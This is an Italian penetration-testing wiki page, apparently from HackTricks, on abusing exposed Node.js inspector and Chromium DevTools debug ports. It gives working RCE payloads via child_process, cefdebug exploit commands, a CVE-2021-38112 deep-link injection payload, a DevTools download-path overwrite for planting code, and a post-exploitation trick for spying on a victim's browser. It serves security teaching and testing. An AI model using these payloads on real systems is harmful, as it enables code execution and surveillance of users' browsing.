# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

Gli esempi pratici storici includono il walkthrough Multimaster e l'attacco al debugger di Visual Studio Code CVE-2019-1414; usali come contesto specifico della versione, senza presumere che ogni target Electron o Chromium attuale esponga le stesse primitive.<sup>[[1]](#references)[[3]](#references)</sup>

## Informazioni di base

[Secondo la documentazione](https://nodejs.org/learn/getting-started/debugging): quando viene avviato con l'opzione `--inspect`, un processo Node.js resta in ascolto di un client di debug. Per **default**, resterà in ascolto sull'host e sulla porta **`127.0.0.1:9229`**. A ogni processo viene inoltre assegnato un **UUID** **univoco**.<sup>[[4]](#references)</sup>

I client Inspector devono conoscere e specificare l'indirizzo dell'host, la porta e l'UUID per connettersi. Un URL completo sarà simile a `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Poiché il **debugger ha accesso completo all'ambiente di esecuzione Node.js**, un malicious actor in grado di connettersi a questa porta potrebbe riuscire a eseguire codice arbitrario per conto del processo Node.js (**potenziale privilege escalation**).<sup>[[4]](#references)</sup>

Esistono diversi modi per avviare un Inspector:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Quando avvii un processo sottoposto a ispezione, apparirà qualcosa di simile:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
I processi basati su **CEF** (**Chromium Embedded Framework**) possono esporre un debugger con `--remote-debugging-port=9222`. Questo espone il browser tramite il [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) anziché tramite un inspector Node.js, quindi i payload basati su `process` di Node.js non sono direttamente applicabili per impostazione predefinita.<sup>[[2]](#references)[[5]](#references)</sup>

Quando avvii un browser sottoposto a debug, apparirà qualcosa di simile:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browser, WebSocket e same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

I siti web aperti in un browser possono effettuare richieste WebSocket e HTTP secondo il modello di sicurezza del browser. Una **connessione HTTP iniziale** è necessaria per **ottenere un ID univoco della sessione del debugger**. La **same-origin-policy** **impedisce** ai siti web di effettuare **questa connessione HTTP**. Per una sicurezza aggiuntiva contro gli [**attacchi DNS rebinding**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js verifica che gli **header 'Host'** della connessione specifichino un **indirizzo IP** oppure **`localhost`** in modo preciso.<sup>[[4]](#references)</sup>

> [!TIP]
> Queste **misure di sicurezza impediscono di sfruttare l'inspector** per eseguire codice **semplicemente inviando una richiesta HTTP** (operazione possibile sfruttando una vuln SSRF).<sup>[[4]](#references)</sup>

### Avvio dell'inspector nei processi in esecuzione

È possibile inviare il **segnale SIGUSR1** a un processo nodejs in esecuzione per fare in modo che **avvii l'inspector** sulla porta predefinita. Tuttavia, è necessario disporre di privilegi sufficienti; ciò potrebbe concedere **accesso privilegiato alle informazioni all'interno del processo**, ma non comporta un'escalation diretta dei privilegi.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Questo è utile nei container perché **arrestare il processo e avviarne uno nuovo** con `--inspect` **non è un'opzione**, poiché il **container** verrà **terminato** insieme al processo.<sup>[[6]](#references)</sup>

### Connettersi all'inspector/debugger

Per connettersi a un **browser basato su Chromium**, è possibile accedere agli URL `chrome://inspect` o `edge://inspect` rispettivamente per Chrome o Edge. Facendo clic sul pulsante Configure, è necessario assicurarsi che **host e porta di destinazione** siano elencati correttamente. L'immagine mostra un esempio di Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Dopo un URL per accedere al debugger apparirà. ad esempio ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Connettersi all'inspector/debugger: Per connettersi a un browser basato su Chromium,...](<../../images/image (674).png>)

Utilizzando la **riga di comando** è possibile connettersi a un debugger/inspector con:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Lo strumento [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) consente di **trovare inspector** in esecuzione localmente e di **iniettare codice** al loro interno.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Nota che gli exploit **RCE di NodeJS** non funzioneranno se connessi a un browser tramite [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (è necessario controllare l'API per trovare attività interessanti da eseguire).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE nel Debugger/Inspector di NodeJS

> [!TIP]
> Se sei arrivato qui cercando come ottenere [**RCE da una XSS in Electron, consulta questa pagina.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Alcuni modi comuni per ottenere **RCE** quando puoi **connetterti** a un **inspector** di Node consistono nell'utilizzare qualcosa di simile (sembra che questo **non funzionerà in una connessione al Chrome DevTools protocol**):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Payload di Chrome DevTools Protocol

Puoi consultare l'API qui: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
In questa sezione elencherò semplicemente alcune cose interessanti che ho trovato e che le persone hanno utilizzato per sfruttare questo protocollo.

### Injection di parametri tramite Deep Links

Nel [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino Security ha scoperto che un'applicazione basata su CEF **registrava un UR**I personalizzato nel sistema (workspaces://index.html), che riceveva l'URI completo e poi **avviava l'applicazio**ne basata su CEF con una configurazione parzialmente costruita a partire da quell'URI.<sup>[[8]](#references)</sup>

È stato scoperto che i parametri dell'URI venivano decodificati tramite URL e utilizzati per avviare l'applicazione di base CEF, consentendo a un utente di **iniettare** il flag **`--gpu-launcher`** nella **command line** ed eseguire operazioni arbitrarie.<sup>[[8]](#references)</sup>

Quindi, un payload come:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Eseguirà calc.exe.<sup>[[8]](#references)</sup>

### Sovrascrivere i file

Modifica la cartella in cui **verranno salvati i file scaricati** e scarica un file per **sovrascrivere** il **codice sorgente** utilizzato frequentemente dall'applicazione con il tuo **codice malevolo**.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE e exfiltration

STAR Labs ha dimostrato che i servizi WebDriver/CDP esposti possono consentire la lettura arbitraria di file e RCE; il DNS rebinding può completare la catena di exploit in alcune configurazioni.<sup>[[9]](#references)</sup>

Per ulteriori casi storici relativi alla browser automation e alla sicurezza di Chromium, consulta il write-up di Counter WebDriver e i problemi di Project Zero 773, 1742 e 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Post-Exploitation

In un ambiente reale e **dopo aver compromesso** un PC utente che utilizza un browser basato su Chrome/Chromium, potresti avviare un processo Chrome con il **debugging attivato ed eseguire il port-forwarding della porta di debugging** per potervi accedere. In questo modo potrai **ispezionare tutto ciò che la vittima fa con Chrome e sottrarre informazioni sensibili**.<sup>[[7]](#references)</sup>

Il metodo stealth consiste nel **terminare ogni processo Chrome** e quindi eseguire qualcosa come:<sup>[[7]](#references)</sup>
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Strumento di ispezione ed exploitation del debugger CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Esecuzione di codice remoto di Visual Studio Code tramite Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Guida al debugging di Node.js - Per iniziare](https://nodejs.org/learn/getting-started/debugging)
- [5] [Protocollo Chrome DevTools](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Writeup di corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Abuso della funzionalità di debugging di Chrome per osservare e controllare da remoto le sessioni di navigazione](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Esecuzione di codice remoto di AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Mi stai parlando? - RCE di WebDriver tramite DNS Rebinding e CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Da bot a RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Problema 773 di Google Project Zero (bug tracker di Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Problema 1742 di Google Project Zero (bug tracker di Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Problema 1944 di Google Project Zero (bug tracker di Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
{{#include ../../banners/hacktricks-training.md}}
